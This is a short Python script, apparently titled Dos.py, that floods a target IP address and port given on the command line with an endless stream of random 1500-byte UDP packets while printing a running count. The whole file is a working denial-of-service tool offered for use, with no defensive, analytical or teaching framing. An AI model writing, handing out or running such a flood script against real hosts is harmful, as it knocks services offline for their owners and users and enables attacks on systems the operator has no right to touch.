#Usage python3 Dos.py TargetIp port
import requests
import sys
import socket
import random
import time

targetIP = f'{sys.argv[1]}'
port = int(sys.argv[2])
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #open new socket

pkt = random._urandom(1500) #create packet
packetTracker = 0


while True:
	sock.sendto(pkt,(targetIP,port))
	packetTracker+=1
	print(f"Sent Socket#{packetTracker} to {targetIP} over port/{port}")
